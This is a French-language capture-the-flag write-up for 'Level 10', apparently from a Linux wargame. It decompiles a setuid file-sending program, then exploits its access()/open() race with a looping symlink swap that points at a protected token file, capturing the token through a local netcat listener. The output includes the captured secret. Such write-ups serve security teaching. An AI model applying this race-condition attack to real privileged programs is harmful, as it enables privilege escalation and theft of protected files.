# Level 10

1) la commande `ls` nous donne ceci:

```bash
ls -la
total 28
dr-xr-x---+ 1 level10 level10   140 Mar  6  2016 .
d--x--x--x  1 root    users     340 Aug 30  2015 ..
-r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout
-r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-r-x------  1 level10 level10   675 Apr  3  2012 .profile
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
```

2) Voici ce qu'on obtient apres avoir decompile `level10`

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>

int main(int argc, char **argv) {
    char *file;
    char *host;
    int sockfd;
    int fd;
    ssize_t bytes_read;
    struct sockaddr_in sin;
    char buffer[4096];

    if (argc < 3) {
        printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
        exit(1);
    }

    file = argv[1];
    host = argv[2];
    if (access(file, 4) != 0)
    {
        printf("You don't have access to %s\n", file);
        return 0;
    }
    printf("Connecting to %s:6969 .. ", host);
    fflush(stdout);
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr(host);
    sin.sin_port = htons(6969);
    if (connect(sockfd, (struct sockaddr *)&sin, sizeof(sin)) == -1) {
        printf("Unable to connect to host %s\n", host);
        exit(1);
    }
    if (write(sockfd, ".*( )*.\n", 8) == -1) {
        printf("Unable to write banner to host %s\n", host);
        exit(1);
    }
    printf("Connected!\nSending file .. ");
    fflush(stdout);
    fd = open(file, O_RDONLY);
    if (fd == -1) {
        puts("Damn. Unable to open file");
        exit(1);
    }
    bytes_read = read(fd, buffer, sizeof(buffer));
    if (bytes_read == -1) {
        printf("Unable to read from file: %s\n", strerror(errno));
        exit(1);
    }
    write(sockfd, buffer, bytes_read);
    puts("wrote file!");
    return 0;
}
```

ce programme affiche juste le contenu d'un fichier sur le terminal d'un client si le serveur a le droit de lancer le fichier passe en parametres.

4) Grace a `nc` nous pouvons tester ce que ca donne:

terminal 1:

```bash
nc -lk 127.0.0.1 6969
.*( )*.
bonsoir
```

terminal 2:

```bash
echo "bonsoir" > /tmp/test
./level10 /tmp/test 127.0.0.1
Connecting to 127.0.0.1:6969 .. Connected!
Sending file .. wrote file!
```

5) L'idee est donc d'utiliser une boucle inifinie du symlink pour tromper la verification des permissions dans le programme:

```bash
#!/bin/bash

echo "empty file" > /tmp/test

while :
do
    ln -sf /home/user/level10/token /tmp/link
    ln -sf /tmp/test /tmp/link
done
```

6) Ensuite nous avons juste a demarrer notre programme en boucle jusqu'a ce que le token s'affiche dans notre client:

```bash
./level10 /tmp/link 127.0.0.1
You don't have access to /tmp/link
./level10 /tmp/link 127.0.0.1
Connecting to 127.0.0.1:6969 .. Connected!
Sending file .. wrote file!
./level10 /tmp/link 127.0.0.1
Connecting to 127.0.0.1:6969 .. Connected!
Sending file .. wrote file!
./level10 /tmp/link 127.0.0.1
You don't have access to /tmp/link
./level10 /tmp/link 127.0.0.1
You don't have access to /tmp/link
./level10 /tmp/link 127.0.0.1
Connecting to 127.0.0.1:6969 .. Connected!
Sending file .. wrote file!
./level10 /tmp/link 127.0.0.1
Connecting to 127.0.0.1:6969 .. Connected!
Sending file .. wrote file!
./level10 /tmp/link 127.0.0.1
You don't have access to /tmp/link
./level10 /tmp/link 127.0.0.1
Connecting to 127.0.0.1:6969 .. Connected!
Sending file .. wrote file!
./level10 /tmp/link 127.0.0.1
You don't have access to /tmp/link
./level10 /tmp/link 127.0.0.1
Connecting to 127.0.0.1:6969 .. Connected!
Sending file .. wrote file!
./level10 /tmp/link 127.0.0.1
You don't have access to /tmp/link
./level10 /tmp/link 127.0.0.1
Connecting to 127.0.0.1:6969 .. Connected!
Sending file .. wrote file!
./level10 /tmp/link 127.0.0.1
You don't have access to /tmp/link
```

Ensuite nous pouvons consulter notre client:

```bash
nc -lk 127.0.0.1 6969
.*( )*.
empty file
.*( )*.
empty file
.*( )*.
empty file
.*( )*.
empty file
.*( )*.
empty file
.*( )*.
empty file
.*( )*.
empty file
.*( )*.
empty file
.*( )*.
empty file
.*( )*.
woupa2yuojeeaaed06riuj63c
```
